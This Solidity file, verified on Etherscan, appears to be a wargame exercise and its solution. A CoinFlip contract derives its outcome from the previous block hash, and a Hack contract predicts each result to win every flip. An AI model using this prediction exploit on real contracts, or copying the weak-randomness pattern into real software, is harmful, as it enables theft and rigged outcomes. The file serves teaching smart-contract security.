/**
 *Submitted for verification at Etherscan.io on 2022-07-10
*/

pragma solidity ^0.8.0;


contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract Hack {

  CoinFlip coinFlip;

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _coinFlip) {
    coinFlip = CoinFlip(_coinFlip);
  }

  function hack() public  {
    uint256 blockValue = uint256(blockhash(block.number-1));

    uint256 coinFlipx = blockValue / FACTOR;
    bool side = coinFlipx == 1 ? true : false;
    
    coinFlip.flip(side);
  }

  function consecutiveWins() public view returns (uint256) {
    return coinFlip.consecutiveWins();
  }
}